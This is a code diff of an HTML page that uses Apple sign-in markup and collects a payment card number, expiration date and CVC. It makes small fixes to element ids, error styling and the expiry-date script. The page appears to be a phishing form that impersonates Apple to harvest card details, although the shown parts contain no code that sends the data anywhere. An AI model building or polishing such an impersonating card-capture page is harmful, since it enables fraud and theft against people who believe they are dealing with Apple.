@@ -13613,7 +13613,7 @@
                                                         </div>
                                                     </div>
                                                     <div id="inputclick" class="account-name form-row  apple-id-focus">
-
+                                                       
                                                         <div class="form-cell">
                                                             <div class=" form-cell-wrapper ">
                                                                 <input type="text" id="cardNumber"
@@ -13621,7 +13621,7 @@
                                                                     aria-invalid="false" autofocus=""
                                                                     data-focus-method="mouse" placeholder="Card Number"
                                                                     name="cardnumber" pattern="\d{16}" required>
-                                                                <span id="cardNumberError" class="error"></span>
+                                                                <span id="cardNumberError" style="color: red;"></span>
 
 
                                                             </div>
@@ -13631,13 +13631,13 @@
 
                                                         <div class="form-cell">
                                                             <div class="  form-cell-wrapper  align_input ">
-                                                                <input type="text" required name="expiration"
+                                                                <input id="expiryDate" type="text" required name="expiration"
                                                                     class="force-ltr form-textbox form-textbox-text"
                                                                     aria-invalid="false" autofocus=""
                                                                     data-focus-method="mouse"
                                                                     placeholder="Expiration Date"
                                                                     pattern="(0[1-9]|1[0-2])\/\d{2}" required>
-                                                                <span id="expiryDateError" class="error"></span>
+                                                                <span id="expiryDateError" style="color: red;"></span>
 
                                                                 <input type="text" required name="cvc"
                                                                     class="force-ltr form-textbox form-textbox-text"
@@ -13667,7 +13667,7 @@
 
                                                             expiryDateInput.addEventListener('input', () => {
                                                                 if(expiryDateInput.value.length == 2){
-                                                                    expiryDateInput.value = expiryDateInput.value + "/"
+                                                                    document.getElementById('expiryDate').value = expiryDateInput.value + "/"
                                                                 }
                                                                 if (!expiryDatePattern.test(expiryDateInput.value)) {
                                                                     expiryDateError.textContent = 'Invalid expiry date (format: mm/dd)';
@@ -13716,7 +13716,7 @@
             </div>
             <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
             </idms-modal>
-        </apple-auth>https://duckduckgo.com/?t=ftsa&q=cheapoair&ia=web
+        </apple-auth>
     </div>
 
     <script>
